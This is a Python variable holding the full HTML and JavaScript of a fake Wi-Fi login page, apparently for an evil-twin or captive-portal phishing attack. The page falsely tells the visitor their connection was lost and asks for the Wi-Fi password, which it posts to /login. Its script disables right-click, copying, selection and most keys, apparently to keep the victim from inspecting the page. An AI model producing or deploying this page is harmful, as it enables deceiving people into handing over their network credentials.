login_page = '''
<!DOCTYPE html>
<html>
<head>
    <title>Wi-Fi Login</title>
    <style>
        * {
            user-select: none;
            -webkit-user-select: none;
            -webkit-touch-callout: none;
        }
        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            overflow: hidden;
            margin: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .box {
            background-color: #111;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 15px limegreen;
            text-align: center;
            width: 90%;
            max-width: 350px;
        }
        input {
            padding: 12px;
            width: 100%;
            margin: 15px 0;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            background: #fff;
            color: #000;
        }
        button {
            padding: 12px 25px;
            background-color: crimson;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
        }
        h3, p {
            color: #ccc;
        }
        .spinner {
            display: none;
            margin-top: 20px;
        }
        .spinner:after {
            content: ' ';
            display: block;
            width: 40px;
            height: 40px;
            margin: auto;
            border-radius: 50%;
            border: 5px solid #ccc;
            border-color: #ccc transparent #ccc transparent;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script>
        // Disable all keys except typing
        document.addEventListener('keydown', function(e) {
            const allowed = ['Backspace', 'Tab', 'Enter', 'Shift', 'ArrowLeft', 'ArrowRight'];
            if (!allowed.includes(e.key) && !e.key.match(/^[a-zA-Z0-9!@#\$%\^&\*\(\)_\+\-=]$/)) {
                e.preventDefault();
            }
        });

        // Disable inspect, right-click, copy etc
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('selectstart', e => e.preventDefault());
        document.addEventListener('copy', e => e.preventDefault());

        function showLoading() {
            document.querySelector('.spinner').style.display = 'block';
        }
    </script>
</head>
<body>
    <div class="box">
        <h3>Your Wi-Fi connection was lost.</h3>
        <p>Please re-enter your password to reconnect.</p>
        <form method="POST" action="/login" onsubmit="showLoading()">
            <input type="password" name="password" placeholder="Wi-Fi Password" required autofocus><br>
            <button type="submit">Reconnect</button>
        </form>
        <div class="spinner"></div>
    </div>
</body>
</html>
'''
